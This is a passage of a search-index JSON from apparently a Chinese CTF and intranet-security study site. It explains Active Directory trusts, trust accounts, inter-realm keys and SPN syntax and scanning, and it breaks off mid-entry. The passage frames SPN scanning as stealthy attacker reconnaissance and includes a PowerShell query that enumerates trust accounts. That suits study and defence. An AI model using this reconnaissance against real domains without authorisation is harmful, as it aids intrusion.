<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u5185\u90e8\u4fe1\u4efb\u67b6\u6784\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#2_1","title":"2.\u5916\u90e8\u4fe1\u4efb","text":"<p>\u5916\u90e8\u4fe1\u4efb\u662f\u6307\u4e24\u4e2a\u4e0d\u540c\u6797\u95f4\u7684\u57df\u4fe1\u4efb\u5173\u7cfb\uff0c\u5916\u90e8\u4fe1\u4efb\u662f\u5355\u5411\u6216\u53cc\u5411\u4e0d\u53ef\u4f20\u9012\u7684\u3002\u6bd4\u5982\u4e24\u4e2a\u6797\u4e4b\u95f4\u9700\u8981\u8de8\u57df\u8d44\u6e90\u8bbf\u95ee\uff0c\u56e0\u6b64\u6709\u5fc5\u8981\u5efa\u7acb\u5916\u90e8\u4fe1\u4efb\u3002\u521b\u5efa\u5916\u90e8\u4fe1\u4efb\u9700\u8981\u5728\u4e24\u4e2a\u57df\u7684 DNS \u4e2d\u8bbe\u7f6e\u4e92\u76f8\u6307\u5411\u5bf9\u65b9\u7684\u6761\u4ef6\u8f6c\u53d1\u5668\uff0c\u786e\u4fdd\u80fd\u6b63\u786e\u89e3\u6790\u5230\u76ee\u6807\u7684\u5730\u5740</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u5916\u90e8\u4fe1\u4efb\u67b6\u6784\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#3_1","title":"3.\u6797\u4fe1\u4efb","text":"<p>\u6797\u4fe1\u4efb\u4e5f\u662f\u6307\u4e24\u4e2a\u4e0d\u540c\u6797\u95f4\u7684\u57df\u4fe1\u4efb\u5173\u7cfb\uff0c\u6797\u4fe1\u4efb\u7ed9\u4e24\u4e2a\u6797\u4e2d\u7684\u57df\u4e4b\u95f4\u63d0\u4f9b\u53cc\u5411\u7684\u53ef\u4f20\u9012\u4fe1\u4efb\u5173\u7cfb\u3002\u6bd4\u5982\u4e24\u4e2a\u6797\u4e2d\u6709\u5f88\u591a\u57df\uff0c\u8981\u8fdb\u884c\u8de8\u57df\u8d44\u6e90\u8bbf\u95ee\u7684\u8bdd\u5c31\u9700\u8981\u8bbe\u7f6e\u5f88\u591a\u6b21\uff0c\u4e3a\u4e86\u7b80\u5316\u64cd\u4f5c\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6797\u4fe1\u4efb\uff0c\u6797\u4fe1\u4efb\u662f\u81ea Windows Server 2003 \u8d77\u62e5\u6709\u7684\u4fe1\u4efb\u5173\u7cfb\u3002\u521b\u5efa\u6797\u4fe1\u4efb\u9700\u8981\u5728\u4e24\u4e2a\u57df\u7684 DNS \u4e2d\u8bbe\u7f6e\u4e92\u76f8\u6307\u5411\u5bf9\u65b9\u7684\u6761\u4ef6\u8f6c\u53d1\u5668\uff0c\u786e\u4fdd\u80fd\u6b63\u786e\u89e3\u6790\u5230\u76ee\u6807\u7684\u5730\u5740\u3002\u6797\u4fe1\u4efb\u53ea\u80fd\u5728\u4e24\u4e2a\u6797\u4e4b\u95f4\u521b\u5efa\uff0c\u4e0d\u80fd\u9690\u5f0f\u6269\u5c55\u5230\u7b2c\u4e09\u4e2a\u6797\u3002\u6bd4\u5982\u5728\u6797 1 \u548c\u6797 2 \u4e4b\u95f4\u521b\u5efa\u4e86\u4e00\u4e2a\u6797\u4fe1\u4efb\uff0c\u5728\u6797 2 \u548c\u6797 3 \u4e4b\u95f4\u4e5f\u521b\u5efa\u4e86\u4e00\u4e2a\u6797\u4fe1\u4efb\uff0c\u5219\u6797 1 \u548c\u6797 3 \u4e4b\u95f4\u6ca1\u6709\u9690\u5f0f\u4fe1\u4efb\u5173\u7cfb\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u6797\u4fe1\u4efb\u67b6\u6784\u56fe\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#_4","title":"\u8de8\u57df\u8d44\u6e90\u8bbf\u95ee","text":"<p>\u8de8\u57df\u662f\u5982\u4f55\u8fdb\u884c\u8d44\u6e90\u8bbf\u95ee\u7684\u5462\uff1f</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u57df\u5185\u8bbf\u95ee\u8d44\u6e90\u7b80\u8981\u6982\u62ec\u4e3a 6 \u6b65\uff1a</p> <p></p> <p>\u90a3\u4e48\uff0c\u53ef\u80fd\u6211\u4eec\u4f1a\u731c\u60f3\uff0c\u8de8\u57df\u8fdb\u884c\u8d44\u6e90\u8bbf\u95ee\u662f\u4e0d\u662f\u4e5f\u662f\u7c7b\u4f3c\u5462\uff1f</p> <p>\u6211\u4eec\u731c\u60f3\u8de8\u57df\u8d44\u6e90\u8bbf\u95ee\u5982\u56fe\u6240\u793a\uff0c\u4f46\u662f\u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u5c31\u77e5\u9053\u5e94\u8be5\u4e0d\u662f\u8fd9\u6837\u3002\u9996\u5148A \u57df\u57df\u63a7\u6ca1\u6709 B \u57df\u8d44\u6e90\u670d\u52a1\u5668\u7684 hash\uff0c\u56e0\u6b64\u65e0\u6cd5\u751f\u6210 B \u57df\u8d44\u6e90\u7684 ST \u670d\u52a1\u7968\u636e\u3002\u5176\u6b21\uff0cB \u57df\u57df\u63a7\u6ca1\u6709 A \u57df\u7684 krbtgt \u54c8\u5e0c\uff0c\u56e0\u6b64\u65e0\u6cd5\u9a8c\u8bc1 PAC\u3002\u6240\u4ee5\u4ee5\u4e0b\u8bbf\u95ee\u6d41\u7a0b\u662f\u884c\u4e0d\u901a\u7684\u3002</p> <p></p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4e3a\u4e86\u8fdb\u884c\u8de8\u57df\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5fae\u8f6f\u63d0\u51fa\u4e86 inter-realm key(\u8de8\u57df\u95f4\u5bc6\u94a5)\u7684\u6982\u5ff5\u3002\u4e0d\u540c\u57df\u95f4\u7684\u57df\u63a7\u5236\u5668\u5fc5\u987b\u5171\u4eab\u4e00\u4e2a inter-realm key\u3002\u7136\u540e\uff0c\u8fd9\u4e9b\u57df\u53ef\u4ee5\u76f8\u4e92\u4fe1\u4efb\u3002inter-realm key \u9ed8\u8ba4\u6bcf\u9694 30 \u5929\u91cd\u7f6e\u4e00\u6b21\u3002\u8fd9\u4e2a inter-realm key \u662fWindows 2000 \u548c Windows Server 2003 \u4e2d\u4f20\u9012\u4fe1\u4efb\u7684\u57fa\u7840\u3002</p> <p>\u771f\u5b9e\u7684\u8de8\u57df\u8d44\u6e90\u8bbf\u95ee\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article3/index.html#_5","title":"\u4fe1\u4efb\u5e10\u6237","text":"<p>\u5728\u6bcf\u4e2a\u57df\u5185\uff0c\u90fd\u6709\u4e00\u4e2a\u4fe1\u4efb\u5e10\u6237\uff0c\u8be5\u5e10\u6237\u4ee5$\u7ed3\u5c3e\uff0c\u8be5\u5e10\u6237\u7684\u54c8\u5e0c\u5c31\u662f inter-realm key \u503c\u3002</p> <pre><code>\u5982\u56fe\u6240\u793a\u57df\u6811\uff0c\u57df A \u5185\u7684\u4fe1\u4efb\u5e10\u6237\u4e3a\u57df B \u548c\u57df C \u7684\u524d\u7f00\uff0c\u4e5f\u5c31\u662fSHANGHAI$\u548c BEIJING$\u3002\u5728\u57df B \u5185\u548c\u57df C \u5185\u7684\u4fe1\u4efb\u5e10\u6237\u5747\u4e3a XIE$\uff0c\u53ea\u4e0d\u8fc7\u524d\u7f00\u4e0d\u540c(shangxie\\XIE$\u3001beijing\\XIE$)\u3002\n</code></pre> <p></p> <p>\u4f7f\u7528\u5982\u4e0b powershell \u547d\u4ee4\u5373\u53ef\u67e5\u8be2\u5f53\u524d\u57df\u5185\u7684\u4fe1\u4efb\u5e10\u6237\uff1a</p> <pre><code>Get-ADUser -filter * -Properties DistinguishedName,samAccountType | ?{$_.name -like \"*$\"}\n</code></pre> <p></p> <pre><code>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u57df xie.com \u5185\u7684\u4fe1\u4efb\u5e10\u6237\u662f SHANGHAI$\u548c BEIJING$\u3002\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html","title":"\u670d\u52a1\u4e3b\u4f53\u540d\u79f0SPN","text":"<p>SPN(ServicePrincipal Names)\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff0c\u662f\u670d\u52a1\u793a\u4f8b(\u5982:HTTP,SMB,Exchange\u7b49\u670d\u52a1)\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002Kerberos\u8eab\u4efd\u9a8c\u8bc1\u4f7f\u7528SPN\u5c06\u670d\u52a1\u5b9e\u4f8b\u4e0e\u670d\u52a1\u767b\u9646\u8d26\u6237\u76f8\u5173\u8054\u3002\u5982\u679c\u5728\u6574\u4e2a\u6797\u6216\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5\u591a\u4e2a\u670d\u52a1\u5b9e\u4f8b\uff0c\u5219\u6bcf\u4e2a\u5b9e\u4f8b\u90fd\u5fc5\u987b\u5177\u6709\u81ea\u5df1\u7684SPN\u3002\u5982\u679c\u5ba2\u6237\u7aef\u4f7f\u7528\u591a\u4e2a\u540d\u79f0\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5219\u7ed9\u5b9a\u670d\u52a1\u5b9e\u4f8b\u53ef\u4ee5\u5177\u6709\u591a\u4e2aSPN\u3002SPN\u59cb\u7ec8\u5305\u542b\u8fd0\u884c\u670d\u52a1\u5b9e\u4f8b\u7684\u4e3b\u673a\u540d\uff0c\u56e0\u6b64\u670d\u52a1\u5b9e\u4f8b\u53ef\u4ee5\u4e3a\u5176\u4e3b\u673a\u7684\u6bcf\u4e2a\u540d\u79f0\u6216\u522b\u540d\u6ce8\u518cSPN\u3002\u4e00\u4e2a\u7528\u6237\u8d26\u6237\u4e0b\u53ef\u4ee5\u5177\u6709\u591a\u4e2aSPN\uff0c\u4f46\u4e00\u4e2aSPN\u53ea\u80fd\u6ce8\u518c\u5230\u4e00\u4e2a\u8d26\u6237\u3002\u5982\u679c\u60f3\u4f7f\u7528Kerberos\u534f\u8bae\u6765\u8ba4\u8bc1\u670d\u52a1\uff0c\u90a3\u4e48\u5fc5\u987b\u6b63\u786e\u914d\u7f6eSPN\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#1spn","title":"1.SPN \u7b80\u4ecb","text":"<p>Windows\u57df\u73af\u5883\u662f\u57fa\u4e8e\u5fae\u8f6f\u7684\u6d3b\u52a8\u76ee\u5f55\u670d\u52a1\u5de5\u4f5c\u7684\uff0c\u5b83\u5728\u7f51\u7edc\u7cfb\u7edf\u73af\u5883\u4e2d\u5c06\u7269\u7406\u4f4d\u7f6e\u5206\u6563\u3001\u6240\u5c5e\u90e8\u95e8\u4e0d\u540c\u7684\u7528\u6237\u8fdb\u884c\u5206\u7ec4\uff0c\u96c6\u4e2d\u8d44\u6e90\uff0c\u6709\u6548\u5730\u5bf9\u8d44\u6e90\u8bbf\u95ee\u63a7\u5236\u6743\u9650\u8fdb\u884c\u7ec6\u7c92\u5ea6\u7684\u5206\u914d\uff0c\u63d0\u9ad8\u4e86\u7f51\u7edc\u73af\u5883\u7684\u5b89\u5168\u6027\u53ca\u7f51\u7edc\u8d44\u6e90\u7edf\u4e00\u5206\u914d\u7ba1\u7406\u7684\u4fbf\u5229\u6027\u3002\u5728\u57df\u73af\u5883\u4e2d\u8fd0\u884c\u7684\u5927\u91cf\u5e94\u7528\u5305\u542b\u4e86\u591a\u79cd\u8d44\u6e90\uff0c\u4e3a\u8d44\u6e90\u7684\u5408\u7406\u5206\u7ec4\u3001\u5206\u7c7b\u548c\u518d\u5206\u914d\u63d0\u4f9b\u4e86\u4fbf\u5229\u3002\u5fae\u8f6f\u7ed9\u57df\u5185\u7684\u6bcf\u79cd\u8d44\u6e90\u5206\u914d\u4e86\u4e0d\u540c\u7684\u670d\u52a1\u4e3b\u4f53\u540d\u79f0(Service Principal Name, SPN)</p> <p>\u5728\u4f7f\u7528Kerberos\u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u4e2d\uff0c\u5fc5\u987b\u5728\u5185\u7f6e\u8d26\u53f7(NetworkService\u3001LocalSystem)\u6216\u8005\u7528\u6237\u8d26\u53f7\u4e0b\u4e3a\u670d\u52a1\u5668\u6ce8\u518cSPN\u3002\u5bf9\u4e8e\u5185\u7f6e\u8d26\u53f7\uff0cSPN\u5c06\u81ea\u52a8\u8fdb\u884c\u6ce8\u518c\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u57df\u7528\u6237\u4e0b\u8fd0\u884c\u670d\u52a1\uff0c\u5219\u5fc5\u987b\u4e3a\u8981\u4f7f\u7528\u7684\u8d26\u53f7\u624b\u52a8\u6ce8\u518cSPN\u3002\u56e0\u4e3a\u57df\u73af\u5883\u4e2d\u7684\u6bcf\u53f0\u670d\u52a1\u5668\u90fd\u9700\u8981\u5728Kerberos\u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1\u4e2d\u6ce8\u518cSPN\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u4f1a\u76f4\u63a5\u5411\u57df\u63a7\u5236\u5668\u53d1\u9001\u67e5\u8be2\u8bf7\u6c42\uff0c\u83b7\u53d6\u5176\u9700\u8981\u7684\u670d\u52a1\u7684SPN\uff0c\u4ece\u800c\u77e5\u6653\u5176\u9700\u8981\u4f7f\u7528\u7684\u670d\u52a1\u8d44\u6e90\u5728\u54ea\u53f0\u673a\u5668\u4e0a\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#11-spn","title":"1.1 SPN\u5206\u7c7b","text":"<p>\u5f53\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u65f6,\u4e3b SPN \u4f1a\u81ea\u52a8\u6dfb\u52a0\u5230\u57df\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u7684ServicePrincipalName \u5c5e\u6027\u4e2d\u3002\u5728\u5b89\u88c5\u65b0\u7684\u670d\u52a1\u540e\uff0cSPN \u4e5f\u4f1a\u88ab\u8bb0\u5f55\u5728\u8ba1\u7b97\u673a\u8d26\u53f7\u7684\u76f8\u5e94\u5c5e\u6027\u4e2d\u3002</p> <p>SPN \u5206\u4e3a\u4e24\u79cd\uff1a\u4e00\u79cd\u6ce8\u518c\u5728 AD \u4e0a\u673a\u5668\u5e10\u6237(Computers)\u4e0b\uff0c\u4e5f\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u53e6\u4e00\u79cd\u6ce8\u518c\u5728\u57df\u7528\u6237\u5e10\u6237(Users)\u4e0b</p> <ol> <li>\u5f53\u4e00\u4e2a\u670d\u52a1\u7684\u6743\u9650\u4e3a Local System \u6216 Network Service\uff0c\u5219 SPN \u6ce8\u518c\u5728\u673a\u5668\u5e10\u6237(Computers)\u4e0b\u3002\u5178\u578b SPN\uff1a\u4f8b\u5982\uff0c<code>HOST/computername</code>\uff0c<code>RPC/computername</code>\uff0c\u8fd9\u4e9b SPN \u662f\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u7684\u3002</li> <li>\u5f53\u4e00\u4e2a\u670d\u52a1\u7684\u6743\u9650\u4e3a\u4e00\u4e2a\u57df\u7528\u6237\uff0c\u5219SPN\u6ce8\u518c\u5728\u57df\u7528\u6237\u5e10\u6237(Users)\u4e0b\u3002\u5178\u578b SPN\uff1a\u5982 <code>MSSQLSvc/dbserver.xie.com:1433</code>\uff0c\u8fd9\u662f\u4e3a\u8fd0\u884c\u5728\u57df\u7528\u6237\u8d26\u6237\u4e0b\u7684 SQL Server \u670d\u52a1\u6ce8\u518c\u7684 SPN\u3002</li> </ol> <p>\u673a\u5668\u5e10\u6237 \uff1a  \u5728 Windows \u57df\u73af\u5883\u4e2d\uff0c\u673a\u5668\u8d26\u6237\uff08Machine Accounts\uff09\u662f Active Directory \u4e3a\u6bcf\u53f0\u52a0\u5165\u57df\u7684\u8ba1\u7b97\u673a\u521b\u5efa\u7684\u8d26\u6237\u3002\u6bcf\u4e2a\u673a\u5668\u8d26\u6237\u5728\u57df\u4e2d\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u5bf9\u8c61\uff08\u901a\u5e38\u4f4d\u4e8e CN=Computers \u5bb9\u5668\u4e0b\uff09\uff0c\u5e76\u4e14\u7528\u4e8e\u8ba1\u7b97\u673a\u4e0e\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u548c\u5b89\u5168\u901a\u4fe1\u3002\u540d\u79f0\u901a\u5e38\u4ee5\u8ba1\u7b97\u673a\u540d\u52a0 $ \u7ed3\u5c3e\u3002</p> <p>\u57df\u7528\u6237\u5e10\u6237  \uff1a \u4e3b\u8981\u7528\u4e8e\u65e5\u5e38\u7684\u64cd\u4f5c\u548c\u8d44\u6e90\u8bbf\u95ee\uff0c\u6743\u9650\u53d7\u5230\u9650\u5236\uff0c\u4ee5\u786e\u4fdd\u7cfb\u7edf\u5b89\u5168\u5e76\u9632\u6b62\u8bef\u64cd\u4f5c\u6216\u6076\u610f\u6d3b\u52a8\u3002</p> \u5c5e\u6027 \u673a\u5668\u8d26\u6237 \u57df\u7528\u6237\u8d26\u6237 \u521b\u5efa\u65b9\u5f0f \u81ea\u52a8\u521b\u5efa\uff0c\u5f53\u8ba1\u7b97\u673a\u52a0\u5165\u57df\u65f6\u751f\u6210 \u7531\u7ba1\u7406\u5458\u624b\u52a8\u521b\u5efa\uff0c\u7528\u4e8e\u6807\u8bc6\u7528\u6237 \u547d\u540d\u683c\u5f0f \u8ba1\u7b97\u673a\u540d + <code>$</code>\uff0c\u5982 <code>WIN10-PC$</code> \u7528\u6237\u5b9a\u4e49\u7684\u540d\u79f0\uff0c\u5982 j.smith \u5bc6\u7801\u7ba1\u7406 \u7cfb\u7edf\u81ea\u52a8\u7ba1\u7406\uff0c\u9ed8\u8ba4\u6bcf 30 \u5929\u66f4\u65b0 \u7528\u6237\u6216\u7ba1\u7406\u5458\u7ba1\u7406\uff0c\u53ef\u6839\u636e\u7b56\u7565\u8981\u6c42\u5b9a\u671f\u66f4\u6539 \u767b\u5f55\u80fd\u529b \u65e0\u6cd5\u76f4\u63a5\u7528\u4e8e\u767b\u5f55\u8ba1\u7b97\u673a\uff0c\u4ec5\u7528\u4e8e\u8ba1\u7b97\u673a\u8ba4\u8bc1 \u7528\u4e8e\u7528\u6237\u767b\u5f55\u8ba1\u7b97\u673a\u548c\u8bbf\u95ee\u57df\u5185\u8d44\u6e90 \u6743\u9650 \u673a\u5668\u8d26\u6237\u7684\u6743\u9650\u4e3b\u8981\u7528\u4e8e\u8ba1\u7b97\u673a\u7ea7\u522b\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u901a\u8fc7 Kerberos \u8ba4\u8bc1\u4e0e\u57df\u63a7\u5236\u5668\u4ea4\u4e92\uff0c\u6267\u884c\u7ec4\u7b56\u7565\uff0c\u8bbf\u95ee\u57df\u4e2d\u7684\u8d44\u6e90\uff08\u5982\u6587\u4ef6\u5171\u4eab\uff09\u3002\u5b83\u4e0d\u80fd\u7528\u6765\u76f4\u63a5\u767b\u5f55\u57df\u4e2d\u7684\u8ba1\u7b97\u673a\u3002 \u7528\u6237\u8d26\u6237\u53ef\u4ee5\u767b\u5f55\u5230\u57df\u4e2d\u7684\u4efb\u4f55\u8ba1\u7b97\u673a\uff0c\u5e76\u6839\u636e\u5206\u914d\u7684\u6743\u9650\u8bbf\u95ee\u6587\u4ef6\u5171\u4eab\u3001\u6253\u5370\u673a\u3001\u6570\u636e\u5e93\u548c\u5176\u4ed6\u7f51\u7edc\u8d44\u6e90\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u7ec4\u7b56\u7565\u5bf9\u57df\u7528\u6237\u8d26\u6237\u7684\u6743\u9650\u8fdb\u884c\u7ec6\u7c92\u5ea6\u63a7\u5236\u3002"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#12-spn","title":"1.2 SPN \u7684\u914d\u7f6e","text":"<p>SPN \u5728\u6ce8\u518c\u5b83\u7684\u6797\u4e2d\u5fc5\u987b\u662f\u552f\u4e00\u7684\u3002 \u5982\u679c\u5b83\u4e0d\u552f\u4e00\uff0c\u8eab\u4efd\u9a8c\u8bc1\u5c06\u5931\u8d25\u3002 SPN\u8bed\u6cd5\u5305\u542b\u56db\u4e2a\u5143\u7d20\uff1a\u4e24\u4e2a\u5fc5\u9700\u7684\u5143\u7d20\u548c\u4e24\u4e2a\u5176\u4ed6\u5143\u7d20\u3002\u5982\u6709\u5fc5\u8981\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u5143\u7d20\u751f\u6210\u4e0b\u8868\u4e2d\u5217\u51fa\u7684\u552f\u4e00\u540d\u79f0\u3002\u5982\u4e0b\u662f SPN \u7684\u683c\u5f0f\uff1a</p> <pre><code>&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;\n</code></pre> <ul> <li>service class\uff1a\u670d\u52a1\u7c7b\uff0c\u7528\u4e8e\u6807\u8bc6\u670d\u52a1\u5e38\u89c4\u7c7b\u7684\u5b57\u7b26\u4e32;\u4f8b\u5982\uff0c\"HOST\"\u3002 \u6709\u4e00\u4e9b\u5df2\u77e5\u7684\u670d\u52a1\u7c7b\u540d\u79f0\uff0c\u4f8b\u5982 Web \u670d\u52a1\u7684\"WWW\"\u6216\u76ee\u5f55\u670d\u52a1\u7684\"LDAP\"\u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u662f\u670d\u52a1\u7c7b\u552f\u4e00\u7684\u4efb\u4f55\u5b57\u7b26\u4e32\u3002 \u8bf7\u6ce8\u610f\uff0cSPN \u8bed\u6cd5\u4f7f\u7528\u6b63\u659c\u6760 (/)\u5206\u9694\u5143\u7d20\uff0c\u56e0\u6b64\u6b64\u5b57\u7b26\u4e0d\u80fd\u51fa\u73b0\u5728\u670d\u52a1\u7c7b\u540d\u4e2d\u3002</li> <li>host\uff1a\u8fd0\u884c\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u7684\u540d\u79f0\u3002 \u8fd9\u53ef\u4ee5\u662f\u5b8c\u5168\u9650\u5b9a\u7684 DNS \u540d\u79f0(FQDN)\u6216NetBIOS \u540d\u79f0\u3002 \u8bf7\u6ce8\u610f\uff0c\u4e0d\u786e\u4fdd NetBIOS \u540d\u79f0\u5728\u6797\u4e2d\u662f\u552f\u4e00\u7684\uff0c\u56e0\u6b64\uff0c\u5305\u542b NetBIOS \u540d\u79f0\u7684 SPN \u53ef\u80fd\u4e0d\u662f\u552f\u4e00\u7684\u3002</li> <li>port\uff1a\u4e00\u4e2a\u53ef\u9009\u7aef\u53e3\u53f7\uff0c\u7528\u4e8e\u533a\u5206\u5355\u4e2a\u4e3b\u8ba1\u7b97\u673a\u4e0a\u540c\u4e00\u670d\u52a1\u7c7b\u7684\u591a\u4e2a\u5b9e\u4f8b\u3002 \u5982\u679c\u670d\u52a1\u4f7f\u7528\u670d\u52a1\u7c7b\u7684\u9ed8\u8ba4\u7aef\u53e3\uff0c\u5219\u7701\u7565\u6b64\u7ec4\u4ef6\u3002</li> <li>service name:\uff1a\u53ef\u590d\u5236\u670d\u52a1 SPN \u4e2d\u4f7f\u7528\u7684\u53ef\u9009\u540d\u79f0\uff0c\u7528\u4e8e\u6807\u8bc6\u670d\u52a1\u6216\u670d\u52a1\u6240\u670d\u52a1\u7684\u57df\u63d0\u4f9b\u7684\u6570\u636e\u6216\u670d\u52a1\u3002</li> </ul> <p></p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#2spn","title":"2.SPN \u626b\u63cf","text":"<p>SPN\u626b\u63cf\u4e5f\u79f0\u4e3a\u201d\u626b\u63cfKerberos\u670d\u52a1\u5b9e\u4f8b\u540d\u79f0\u201d\u3002\u5728\u6d3b\u52a8\u76ee\u5f55\u4e2d\u53d1\u73b0\u670d\u52a1\u7684\u6700\u4f73\u65b9\u6cd5\u5c31\u662fSPN\u626b\u63cf\u3002SPN\u626b\u63cf\u901a\u8fc7\u8bf7\u6c42\u7279\u5b9aSPN\u7c7b\u578b\u7684\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u6765\u67e5\u627e\u670d\u52a1\u3002\u4e0e\u7f51\u7edc\u7aef\u53e3\u626b\u63cf\u76f8\u6bd4\uff0cSPN\u626b\u63cf\u7684\u4e3b\u8981\u7279\u70b9\u662f\u4e0d\u9700\u8981\u901a\u8fc7\u8fde\u63a5\u7f51\u7edc\u4e2d\u7684\u6bcf\u4e2aIP\u5730\u5740\u6765\u68c0\u67e5\u670d\u52a1\u7aef\u53e3(\u4e0d\u4f1a\u56e0\u4e3a\u89e6\u53d1\u5185\u7f51\u4e2d\u7684IPS\u3001IDS\u7b49\u8bbe\u5907\u7684\u89c4\u5219\u800c\u4ea7\u751f\u5927\u91cf\u7684\u8b66\u544a\u65e5\u5fd7)\u3002\u56e0\u4e3aSPN\u67e5\u8be2\u662fKerberos\u7968\u636e\u884c\u4e3a\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u68c0\u6d4b\u96be\u5ea6\u5f88\u5927\u3002</p> <p>1.Kerberos \u4f7f\u7528 SPN \u6765\u6807\u8bc6\u670d\u52a1\u5b9e\u4f8b</p> <p>Kerberos \u8ba4\u8bc1\u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u901a\u8fc7 SPN \u6765\u8bf7\u6c42\u7279\u5b9a\u670d\u52a1\u7684\u8bbf\u95ee\u6743\u9650\u3002SPN \u662f\u5728\u57df\u4e2d\u552f\u4e00\u6807\u8bc6\u67d0\u4e2a\u670d\u52a1\u5b9e\u4f8b\u7684\u540d\u79f0\uff0c\u5f53\u5ba2\u6237\u7aef\u60f3\u8981\u4e0e\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u65f6\uff0c\u5b83\u5fc5\u987b\u6307\u5b9a\u8be5\u670d\u52a1\u7684 SPN\u3002<code>Kerberos KDC\uff08Key Distribution Center\uff09</code>\u901a\u8fc7 SPN \u627e\u5230\u670d\u52a1\u5b9e\u4f8b\u5e76\u4e3a\u5ba2\u6237\u7aef\u751f\u6210\u670d\u52a1\u7968\u636e (Service Ticket)\u3002\u4f8b\u5982\uff0c\u5ba2\u6237\u7aef\u8bf7\u6c42\u8bbf\u95ee\u8fd0\u884c\u5728 server.example.com \u4e0a\u7684 SQL Server \u670d\u52a1\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528 SPN <code>MSSQLSvc/server.example.com:1433</code> \u6765\u6807\u8bc6\u8be5\u670d\u52a1\u5b9e\u4f8b\u3002</p> <p>\u56e0\u6b64\uff0c\u626b\u63cf SPN \u5b9e\u9645\u4e0a\u662f\u5728\u6536\u96c6\u53ef\u4ee5\u901a\u8fc7 Kerberos \u8ba4\u8bc1\u7684 \u670d\u52a1\u5b9e\u4f8b</p> <p>2.SPN \u8868\u793a\u670d\u52a1\u5b9e\u4f8b\u7684\u5177\u4f53\u914d\u7f6e</p> <p>\u4e0d\u540c\u7684\u670d\u52a1\u5b9e\u4f8b\uff08\u5982 SQL Server\u3001Exchange Server\u3001Web \u670d\u52a1\u7b49\uff09\u5728\u57df\u4e2d\u53ef\u80fd\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u6216\u7aef\u53e3\u4e0a\uff0cSPN \u4e2d\u4f1a\u5305\u542b\u8fd9\u4e9b\u5177\u4f53\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u626b\u63cf SPN\uff0c\u7ba1\u7406\u5458\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u8bc6\u522b\u54ea\u4e9b\u670d\u52a1\u5b9e\u4f8b\u5728\u4ec0\u4e48\u670d\u52a1\u5668\u6216\u7aef\u53e3\u4e0a\u8fd0\u884c\u3002\u4f8b\u5982\uff0c<code>MSSQLSvc/server.example.com:1433</code> \u8868\u793a\u8fd0\u884c\u5728 server.example.com \u4e3b\u673a\u4e0a\u3001\u7aef\u53e3 1433 \u7684 SQL Server \u5b9e\u4f8b\u3002</p> <p>\u901a\u8fc7\u626b\u63cf SPN\uff0c\u80fd\u591f\u83b7\u5f97\u8fd9\u4e9b\u5177\u4f53\u7684\u670d\u52a1\u4fe1\u606f\uff0c\u4ece\u800c\u4e86\u89e3\u7f51\u7edc\u4e2d\u7684\u670d\u52a1\u914d\u7f6e\u60c5\u51b5\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#21-spn","title":"2.1 SPN \u547d\u4ee4\u683c\u5f0f","text":"<pre><code>SPN = serviceclass \"/\" hostname [\":\"port] [\"/\" 